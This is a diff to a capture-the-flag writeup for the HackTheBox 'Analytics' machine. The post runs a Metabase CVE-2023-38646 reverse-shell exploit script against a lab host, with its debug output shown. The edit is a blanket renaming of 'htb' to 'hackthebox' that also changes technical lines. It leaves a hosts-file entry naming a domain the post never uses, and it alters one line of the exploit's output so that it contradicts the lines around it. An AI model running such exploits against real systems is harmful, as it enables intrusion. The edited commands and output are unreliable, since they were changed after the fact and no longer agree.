@@ -1,8 +1,8 @@
 ---
 layout: post
-title: Analytics HTB - Writeup
-categories: [HTB]
-tags: [htb,web,htb easy,linux,cve,rce,kernel exploit]
+title: Analytics HackTheBox Machine - Writeup
+categories: [HackTheBox Machines]
+tags: [hackthebox,web,hackthebox easy,linux,cve,rce,kernel exploit]
 image:
   path: /images/htb/easy/analytics/icon.png
 ---
@@ -41,7 +41,7 @@ After clicking `Login` were shown a new subdomain: `data.analytical.htb`.
 Lets add that to the `/etc/hosts` file.
 
 ```
-10.10.11.233 data.analytical.htb,analytical.htb
+10.10.11.233 data.analytical.hackthebox,analytical.htb
 ```
 
 Visiting `data.analytical.htb` we see a Metabase login page.
@@ -64,7 +64,7 @@ And lets run the exploit:
 $ python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lport 4444 --lhost 10.10.***.***
 [DEBUG] Original rhost: http://data.analytical.htb
 [DEBUG] Preprocessed rhost: http://data.analytical.htb
-[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.***.***, lport: 4444
+[DEBUG] Input Arguments - rhost: http://data.analytical.hackthebox, lhost: 10.10.***.***, lport: 4444
 [DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
 [DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
 [DEBUG] Version: v0.46.6
